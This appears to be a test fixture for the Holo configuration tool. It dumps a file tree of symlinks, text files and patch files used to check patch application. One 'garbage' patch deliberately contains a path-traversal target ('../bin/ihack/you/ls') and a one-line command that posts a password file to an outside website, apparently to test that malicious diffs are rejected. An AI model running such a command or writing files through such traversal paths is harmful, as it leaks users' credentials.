@@ -1,0 +1,152 @@
+symlink   0777 ./etc/holorc
+../../../holorc
+----------------------------------------
+file      0644 ./etc/os-release
+ID=unittest
+----------------------------------------
+symlink   0777 ./etc/symlink
+txtfile
+----------------------------------------
+symlink   0777 ./etc/symlink-to-plain
+txtfile
+----------------------------------------
+file      0644 ./etc/txtfile
+foo
+foo
+foo
+baz
+bar
+bar
+----------------------------------------
+file      0644 ./etc/txtfile-to-symlink
+foo
+foo
+foo
+baz
+bar
+bar
+----------------------------------------
+file      0644 ./etc/txtfile-with-fuzz
+foo
+foo
+foo
+baz
+bar
+bar
+----------------------------------------
+file      0644 ./etc/txtfile-with-garbage
+foo
+foo
+foo
+baz
+bar
+bar
+----------------------------------------
+file      0644 ./usr/share/holo/files/17-patches/etc/symlink-to-plain.patch
+diff --git a/symlink-to-plain b/symlink-to-plain
+deleted file mode 120000
+index d2eecfe..0000000
+--- a/symlink-to-plain
++++ /dev/null
+@@ -1 +0,0 @@
+-txtfile
+\ No newline at end of file
+diff --git a/symlink-to-plain b/symlink-to-plain
+new file mode 100644
+index 0000000..dacb3b9
+--- /dev/null
++++ b/symlink-to-plain
+@@ -0,0 +1,4 @@
++foo
++foo
++foo
++bar
+----------------------------------------
+file      0644 ./usr/share/holo/files/17-patches/etc/symlink.patch
+diff --git a/symlink b/symlink
+index 1a010b1..30d67d4 120000
+--- a/symlink
++++ b/symlink
+@@ -1 +1 @@
+-txtfile
+\ No newline at end of file
++txtfile-with-fuzz
+\ No newline at end of file
+----------------------------------------
+file      0644 ./usr/share/holo/files/17-patches/etc/txtfile-to-symlink.patch
+diff --git a/txtfile-to-symlink b/txtfile-to-symlink
+deleted file mode 100644
+index efbe4b6..0000000
+--- a/txtfile-to-symlink
++++ /dev/null
+@@ -1,6 +0,0 @@
+-foo
+-foo
+-foo
+-baz
+-bar
+-bar
+diff --git a/txtfile-to-symlink b/txtfile-to-symlink
+new file mode 120000
+index 0000000..d2eecfe
+--- /dev/null
++++ b/txtfile-to-symlink
+@@ -0,0 +1 @@
++txtfile
+\ No newline at end of file
+----------------------------------------
+file      0644 ./usr/share/holo/files/17-patches/etc/txtfile-with-fuzz.patch
+diff --git a/txtfile-with-fuzz b/txtfile-with-fuzz
+index efbe4b6..dacb3b9 100644
+--- a/txtfile-with-fuzz
++++ b/txtfile-with-fuzz
+@@ -1,6 +1,4 @@
+ fuzz
+ foo
+ foo
+-baz
+-bar
+ bar
+----------------------------------------
+file      0644 ./usr/share/holo/files/17-patches/etc/txtfile-with-garbage.patch
+diff --git some/funny/nested/subdir/txtfile-with-garbage a/different/directory/txtfile-with-garbage
+index efbe4b6..dacb3b9 100644
+--- some/funny/nested/subdir/txtfile-with-garbage
++++ a/different/directory/txtfile-with-garbage
+@@ -1,6 +1,4 @@
+ foo
+ foo
+ foo
+-baz
+-bar
+ bar
+diff --git a/garbage b/garbage
+new file mode 100644
+index 0000000..07360e3
+--- /dev/null
++++ b/garbage
+@@ -0,0 +1 @@
++zap
+diff --git ../bin/ihack/you/ls  ../bin/ihack/you/ls
+new file mode 100644
+index 0000000..07360e3
+--- ../bin/ihack/you/ls
++++ ../bin/ihack/you/ls
+@@ -0,0 +1 @@
++curl --post ~/.passwords https://4chan.org/
+----------------------------------------
+file      0644 ./usr/share/holo/files/17-patches/etc/txtfile.patch
+diff --git a/txtfile b/txtfile
+old mode 100644
+new mode 100755
+index efbe4b6..dacb3b9
+--- a/txtfile
++++ b/txtfile
+@@ -1,6 +1,4 @@
+ foo
+ foo
+ foo
+-baz
+-bar
+ bar
+----------------------------------------
